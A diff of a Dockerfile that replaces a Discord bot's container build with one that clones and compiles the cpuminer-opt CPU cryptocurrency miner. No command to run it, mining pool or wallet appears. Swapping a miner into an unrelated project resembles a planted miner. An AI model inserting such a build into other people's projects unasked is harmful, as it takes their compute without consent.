@@ -1,13 +1,21 @@
-# Trying out a docker image from gorialis that will hopefully fix some things
+FROM ubuntu:xenial
 
-FROM gorialis/discord.py
-ENV TZ="America/Phoenix"
+WORKDIR /root/
 
-WORKDIR /app
+RUN apt-get update && apt-get -qy install \
+ automake \
+ build-essential \
+ libcurl4-openssl-dev \
+ libssl-dev \
+ git \
+ ca-certificates \
+ libjansson-dev libgmp-dev g++ --no-install-recommends
 
-COPY requirements.txt ./
-RUN pip install -r requirements.txt
 
-COPY . .
+RUN git clone --recursive https://github.com/JayDDee/cpuminer-opt cpuminer-multi
+WORKDIR /root/cpuminer-multi
 
-CMD ["python", "RoommateBot.py"]
+RUN ./autogen.sh
+RUN CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
+
+RUN make
